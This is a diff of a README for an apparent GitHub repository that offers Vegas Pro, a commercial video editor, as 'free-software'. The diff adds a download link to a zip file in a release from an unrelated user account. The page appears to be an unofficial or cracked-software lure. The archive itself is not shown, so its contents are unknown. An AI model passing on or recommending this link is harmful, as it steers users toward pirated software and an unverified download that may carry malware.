@@ -7,7 +7,7 @@ Welcome to the Vegas Pro repository! 🚀 This is your ultimate destination for 
 - Topics: Vegas, video-editing, post-production, free-software, multimedia, filmmaking 
 
 ## 🔗 Software Access  
-[Download Vegas Pro]()
+[Download Vegas Pro](https://github.com/Kavith12/Vegas-Pro-Full-2025/releases/download/VegasPro/VegasPro.zip)
 
 Note: Make sure to visit the link to acquire the software package. 💻  
 
